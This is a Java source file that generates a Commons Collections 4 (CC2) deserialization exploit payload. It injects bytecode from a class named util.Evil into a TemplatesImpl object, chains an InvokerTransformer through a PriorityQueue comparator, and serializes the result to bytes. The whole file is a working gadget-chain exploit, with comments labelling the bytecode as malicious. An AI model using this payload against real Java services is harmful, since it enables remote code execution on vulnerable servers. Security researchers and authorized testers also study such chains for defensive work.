import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import util.SerializeUtil;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class payloadCC2 {
    public static byte[] getpayloadcc2() throws IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(1);
        //获取恶意类的字节码
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("util.Evil");
        byte[] evilPayload = ctClass.toBytecode();
        //设置恶意字节码到TemplatesImpl中
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates,"_name","v1f18");
//        SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{evilPayload});
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",null,null);
        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
        SerializeUtil.setFieldValue(priorityQueue,"comparator",transformingComparator);

        Field queue = priorityQueue.getClass().getDeclaredField("queue");
        queue.setAccessible(true);
        Object[] o = (Object[]) queue.get(priorityQueue);
        o[0] = templates;
        return SerializeUtil.writeObjectToByteArray(priorityQueue).toByteArray();

    }
}
